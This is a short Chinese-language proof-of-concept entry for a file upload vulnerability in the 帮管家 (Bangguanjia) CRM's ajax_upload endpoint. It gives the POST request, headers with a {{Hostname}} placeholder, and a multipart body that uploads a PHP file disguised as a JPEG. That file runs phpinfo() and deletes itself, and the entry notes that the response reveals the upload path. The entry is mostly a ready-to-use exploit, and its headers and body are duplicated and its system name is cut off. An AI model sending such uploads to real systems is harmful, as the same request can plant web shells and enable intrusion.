# 帮管家CRMajax_upload和ajax_upload_chat存在文件上传漏洞

- **系统**：帮管家CRMajax_upload和　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /index.php/upload/ajax_upload HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o`　`Host: {{Hostname}}`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o`

**请求体 / payload**
```
------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php
phpinfo();unlink(__FILE__);
------WebKitFormBoundaryv1WbOn5o--
回显了上传路径
------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php
phpinfo();unlink(__FILE__);
------WebKitFormBoundaryv1WbOn5o--
```